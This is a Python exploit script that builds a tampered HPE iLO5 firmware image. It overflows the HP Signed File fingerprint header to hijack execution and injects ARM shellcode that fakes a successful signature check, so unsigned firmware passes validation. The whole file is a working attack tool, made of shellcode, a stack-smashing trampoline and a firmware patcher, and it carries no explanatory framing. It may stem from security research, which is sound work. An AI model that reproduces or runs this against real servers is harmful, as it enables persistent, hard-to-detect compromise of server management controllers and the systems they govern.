#!/usr/bin/python

from struct import pack
from keystone import *
import struct
import sys

INPUT_FILE = sys.argv[1];
OUTPUT_FILE = "bad_firm.bin"

HPIMAGE_BLOB_TMP_ADDR = 0x729A0  #  1.30.35
HPIMAGE_BLOB_TMP_ADDR = 0x72998  #  1.20.33


###############################################################################
# setup shellcode body
# - return sig_ok
# - fix stack
# - emulate return from: validate_integrity
#

# extract_hp_signed_file, 7 registers
# char input_buffer[1024]; // [sp+10h] [bp-420h]
# ROM:0001C154 loc_1C154
# ROM:0001C154                 MOV             R7, #0x414
# ROM:0001C15C                 MOV             R0, R12
# ROM:0001C160                 ADD             SP, SP, R7
# ROM:0001C164                 LDMFD           SP!, {R5-R8,R10,R11,PC}

# fum_load_hpimg, 7 registers
# ROM:0001C7A0                 MOV             R0, R12
# ROM:0001C7A4                 ADD             SP, SP, #0x14
# ROM:0001C7A8                 LDMFD           SP!, {R5-R8,R10,R11,PC}

# validate_integrity, 7 registers
# ROM:0001C95C                 MOV             R12, R5
# ROM:0001C960                 MOV             R7, #0x434
# ROM:0001C968                 MOV             R0, R12
# ROM:0001C96C                 ADD             SP, SP, R7
# ROM:0001C970                 LDMFD           SP!, {R5-R8,R10,R11,PC}

# validate_integrity_
# ROM:0001C9B4                 MOV             R12, R0
# ROM:0001C9B8                 MOV             R0, R12
# ROM:0001C9BC                 ADD             SP, SP, #0x14
# ROM:0001C9C0                 LDMFD           SP!, {R5-R7,R10,PC}


# callstack:
#    validate_integrity_
#         -> validate_integrity
#             -> fum_load_hpimg
#                 -> extract_hp_signed_file
#
# highjack execution flow during
# extract_hp_signed_file -> fum_load_hpimg transition


asm_shellcode = """
MOV R0, #1000        // set rc to 0 (SIG_OK)
SUB R0, #1000

ADD SP, SP, #0x14    // unwind fum_load_hpimg
ADD SP, SP, #0x1C

MOV R7, #0x434       // unwind validate_integrity
ADD SP, SP, R7
ADD SP, SP, #0x1C

MOV R7, #0xC9B4      // land into validate_integrity_
ADD R7, R7, #0x10000
BX  R7
"""

print "[+] compiling shellcode body"
ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
sc_body = ''.join(chr(x) for x in ks.asm(asm_shellcode)[0])
sc_body_len = len(sc_body)

if (sc_body_len > 0x100):
    print "[x] code cave too short for sc_body (0x%x)" % sc_body_len

print "> sc_body size: 0x%x" % sc_body_len

# pad up to 0x100 bytes
sc_body += "\x00" * (0x100-sc_body_len)


###############################################################################
# setup shellcode trampoline in HP Signed File header
# - abuse long line

print "[+] compiling trampoline"

nop_ins = ''.join(chr(x) for x in ks.asm("SUBPL    r3, r1, #56")[0])
bad_reg = "BEEF"

ret_addr = struct.pack('<L', HPIMAGE_BLOB_TMP_ADDR+0x100)[:3]


# generate trampoline, ret from extract_hp_signed_file to fum_load_hpimg
payload  = "Dragonpunch: "
while (len(payload) % 4) != 0:
    payload += "A"
payload += "A" * (0x404 - len(payload))
payload += bad_reg * 6 # R5-R8,R10,R11
payload += ret_addr
payload += "\n"

print "> payload size: 0x%x" % len(payload)


skel = """--=</Begin HP Signed File Fingerprint\>=--
--=</Begin HP Signed File Fingerprint\>=--
Fingerprint Length: 000880
Key: label_HPE-HPB-BMC-ILO5-4096
Hash: sha512
%s
Fingerprint Length: 000880
--=</End HP Signed File Fingerprint\>=--
""" % payload[:-1]

print "> HP Signed File skel size: 0x%x" % len(skel)


with open(INPUT_FILE, 'rb') as fdin:
    fw = fdin.read()
    print "> input firmware size: 0x%x" % len(fw)

    offsetb = fw.find('--=</End HP Signed File Fingerprint\>=--')
    if (offsetb == -1):
        print "> End of block not found"
        sys.exit(-1)
    offsetb += len('--=</End HP Signed File Fingerprint\>=--\n')

    offset_hpimg = fw.find('HPIMAGE')
    if (offset_hpimg == -1):
        print "> HPIMAGE blob not found"
        sys.exit(-1)

    print "> HPIMAGE blob at offset: 0x%x" % offset_hpimg
    hpimage = fw[offset_hpimg::]
    #certifs = fw[offsetb:offset_hpimg]

    with open(OUTPUT_FILE,"wb") as fdout:
        # write rogue HP Signed file header
        fdout.write(skel)
        #fdout.write(certifs)

        # write HPIMAGE body
        fdout.write(hpimage[0:0x100])
        fdout.write(sc_body)
        fdout.write(hpimage[0x200::])

        print "> output firmware size: 0x%x" % fdout.tell()

print "\n[+] may the force be with your payload!"
